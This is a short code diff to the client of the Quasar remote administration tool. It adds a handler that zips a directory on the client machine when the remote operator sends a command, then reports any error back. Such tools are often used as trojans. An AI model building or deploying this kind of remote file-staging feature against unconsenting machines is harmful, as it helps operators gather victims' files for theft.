@@ -1,4 +1,5 @@
-﻿using Quasar.Client.Utilities;
+﻿using Ionic.Zip;
+using Quasar.Client.Utilities;
 using Quasar.Common.Enums;
 using Quasar.Common.Extensions;
 using Quasar.Common.IO;
@@ -6,6 +7,7 @@ using Quasar.Common.Messages;
 using Quasar.Common.Models;
 using System;
 using System.IO;
+using System.IO.Compression;
 using System.Security;
 using System.Threading;
 
@@ -225,6 +227,36 @@ namespace Quasar.Client.Commands
             {
                 if (isError && !string.IsNullOrEmpty(message))
                     client.Send(new SetStatusFileManager {Message = message, SetLastDirectorySeen = false});
+            }
+        }
+
+        public static void HandleDoZipDirectory(DoZipDirectory command, Networking.Client client) 
+        {
+            bool isError = false;
+            string message = null;
+
+            Action<string> onError = (msg) => {
+                isError = true;
+                message = msg;
+            };
+
+            try
+            {
+                using (ZipFile zip = new ZipFile())
+                {
+                    zip.AddDirectory(command.Path, Path.GetDirectoryName(command.Path));
+                    zip.Save(command.Path + "_pending.zip");
+                }
+                File.Move(command.Path + "_pending.zip", command.Path + "_completed.zip");
+            }
+            catch (Exception ex)
+            {
+                onError("ZipDirectory " + ex.Message);
+            }
+            finally
+            {
+                if (isError && !string.IsNullOrEmpty(message))
+                    client.Send(new SetStatusFileManager { Message = message, SetLastDirectorySeen = false });
             }
         }
 
